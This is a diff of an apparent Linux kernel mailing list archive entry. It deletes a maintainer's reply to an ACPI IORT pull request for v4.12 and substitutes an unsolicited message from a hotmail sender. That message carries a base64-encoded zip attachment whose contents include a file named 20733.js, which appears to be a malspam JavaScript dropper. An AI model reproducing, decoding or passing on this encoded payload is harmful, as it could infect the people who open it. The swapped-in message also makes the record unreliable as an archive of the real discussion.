@@ -1,51 +1,85 @@
-From: Catalin Marinas <catalin.marinas@arm.com>
-Subject: Re: [GIT PULL] ACPI IORT changes for v4.12
-Date: Tue, 4 Apr 2017 18:04:18 +0100
-Message-ID: <20170404170418.GF19969@e104818-lin.cambridge.arm.com>
-References: <20170331100226.GA30762@red-moon>
+From: <lizdebeth_@hotmail.com>
+Subject: 38932 linux-acpi
+Date: Tue, 04 Apr 2017 17:17:09 -0000
+Message-ID: <149132622999.6120.13158772104032314800@candw.ag>
+Reply-To: <lizdebeth_@hotmail.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="4764772.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from foss.arm.com ([217.140.101.70]:47342 "EHLO foss.arm.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1751979AbdDDREX (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
-        Tue, 4 Apr 2017 13:04:23 -0400
-Content-Disposition: inline
-In-Reply-To: <20170331100226.GA30762@red-moon>
+Received: from 206-214-7-244.candw.ag ([206.214.7.244]:56739 "HELO candw.ag"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751270AbdDDRRY (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Tue, 4 Apr 2017 13:17:24 -0400
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: Lorenzo Pieralisi <lorenzo.pieralisi@arm.com>
-Cc: will.deacon@arm.com, marc.zyngier@arm.com, john.garry@huawei.com, rjw@rjwysocki.net, linux-acpi@vger.kernel.org, hanjun.guo@linaro.org, linux-arm-kernel@lists.infradead.org
+To: linux-acpi <linux-acpi@vger.kernel.org>
 
-On Fri, Mar 31, 2017 at 11:02:26AM +0100, Lorenzo Pieralisi wrote:
-> ----------------------------------------------------------------
-> ACPI ARM64 specific changes for v4.12.
-> 
-> Patches contain:
-> 
-> - IORT kernel interface misc clean-ups
-> - IORT id mapping interface refactoring in preparation for platform
->   MSI (IORT named components -> GIC ITS mappings) devid mapping code
-> - IORT id mapping implementation for named components nodes to ITS nodes,
->   in order to provide the kernel with a firmware interface to map
->   platform devices devids to GIC ITS components
-> 
-> ----------------------------------------------------------------
-> Hanjun Guo (7):
->       ACPI/IORT: Fix the indentation in iort_scan_node()
->       ACPI/IORT: Add missing comment for iort_dev_find_its_id()
->       ACPI/IORT: Rework iort_match_node_callback() return value handling
->       ACPI/IORT: Rename iort_node_map_rid() to make it generic
->       ACPI/IORT: Introduce iort_node_map_platform_id() to retrieve dev id
->       ACPI: platform-msi: retrieve devid from IORT
->       ACPI: platform: setup MSI domain for ACPI based platform device
-> 
->  drivers/acpi/arm64/iort.c | 158 +++++++++++++++++++++++++++++++++++++---------
->  drivers/acpi/glue.c       |   6 ++
->  include/linux/acpi_iort.h |   3 +
->  3 files changed, 136 insertions(+), 31 deletions(-)
-
-Pulled for 4.12. Thanks.
-
--- 
-Catalin
+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
